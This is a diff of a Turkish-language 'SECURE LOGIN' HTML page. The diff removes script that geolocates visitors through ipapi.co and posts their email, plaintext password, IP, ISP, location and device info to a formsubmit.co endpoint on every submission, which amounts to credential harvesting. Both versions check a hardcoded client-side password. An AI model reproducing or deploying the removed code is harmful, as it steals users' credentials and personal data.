@@ -71,6 +71,7 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 6px; color: #fff;
             box-sizing: border-box;
+            outline: none;
         }
 
         .btn-submit, .btn-copy {
@@ -135,14 +136,8 @@
         <h1>SECURE LOGIN</h1>
 
         <form id="mainForm">
-            <input type="hidden" id="userIP">
-            <input type="hidden" id="userISP">
-            <input type="hidden" id="userLocation">
-            <input type="hidden" id="deviceInfo">
-            
             <input type="email" id="emailInput" placeholder="E-posta Adresi" required>
             <input type="password" id="passInput" placeholder="Sistem Şifresi" required>
-            
             <button type="submit" class="btn-submit" id="submitBtn">Sisteme Bağlan</button>
         </form>
     </div>
@@ -166,79 +161,35 @@
     </div>
 
     <script>
-        document.getElementById('deviceInfo').value = navigator.userAgent;
-
-        fetch('https://ipapi.co/json/')
-            .then(r => r.json())
-            .then(d => {
-                document.getElementById('userIP').value = d.ip || "Bilinmiyor";
-                document.getElementById('userISP').value = d.org || "Bilinmiyor";
-                document.getElementById('userLocation').value = (d.city || "") + " / " + (d.country_name || "");
-            }).catch(() => console.log("Bilgi alınamadı."));
-
-        // Şifreni ve Form ID'ni buraya girmeyi unutma!
-        const MASTER_PASSWORD = "mjuytrewqaz"; 
-        const FORM_ID = "19273e639ed99bee214f2b82f3953fff";
+        // --- AYARLAR ---
+        const MASTER_PASSWORD = "mjuytrewqaz"; // Tırnak içine şifreni yaz!
 
         document.getElementById('mainForm').onsubmit = function(e) {
             e.preventDefault();
-            const email = document.getElementById('emailInput').value;
             const password = document.getElementById('passInput').value;
             const btn = document.getElementById('submitBtn');
 
+            // Şifre Yanlışsa
             if (password !== MASTER_PASSWORD) {
                 btn.innerText = "YETKİSİZ GİRİŞ!";
-                btn.style.background = "red";
-                btn.disabled = true;
+                btn.style.background = "#ff4d4d";
+                alert("HATA: Girdiğiniz şifre sistemle eşleşmiyor!");
                 
-                fetch(`https://formsubmit.co/ajax/${FORM_ID}`, {
-                    method: "POST",
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify({
-                        _subject: "⚠️ BAŞARISIZ GİRİŞ: " + email,
-                        Durum: "Hatalı Şifre",
-                        Email: email,
-                        Sifre: password,
-                        IP: document.getElementById('userIP').value,
-                        Konum: document.getElementById('userLocation').value
-                    })
-                }).finally(() => {
-                    setTimeout(() => {
-                        btn.innerText = "Sisteme Bağlan";
-                        btn.style.background = "linear-gradient(45deg, #007bff, #0056b3)";
-                        btn.disabled = false;
-                    }, 2000);
-                });
-                alert("HATA: Yetkisiz giriş denemesi!");
+                setTimeout(() => {
+                    btn.innerText = "Sisteme Bağlan";
+                    btn.style.background = "linear-gradient(45deg, #007bff, #0056b3)";
+                }, 2000);
                 return;
             }
 
+            // Şifre Doğruysa (Dışa veri göndermeden direkt açar)
             btn.innerText = "BAĞLANILIYOR...";
             btn.disabled = true;
 
-            fetch(`https://formsubmit.co/ajax/${FORM_ID}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                body: JSON.stringify({
-                    _subject: "BAŞARILI GİRİŞ: " + email,
-                    Email: email,
-                    Sifre: password,
-                    IP: document.getElementById('userIP').value,
-                    ISS: document.getElementById('userISP').value,
-                    Konum: document.getElementById('userLocation').value,
-                    Cihaz: document.getElementById('deviceInfo').value
-                })
-            })
-            .then(res => {
-                if(res.ok) {
-                    document.getElementById('login-container').style.display = 'none';
-                    document.getElementById('success-screen').style.display = 'block';
-                } else {
-                    alert("Bir sorun oluştu.");
-                    btn.innerText = "Tekrar Dene";
-                    btn.disabled = false;
-                }
-            });
+            setTimeout(() => {
+                document.getElementById('login-container').style.display = 'none';
+                document.getElementById('success-screen').style.display = 'block';
+            }, 600); 
         };
 
         function copyID() {
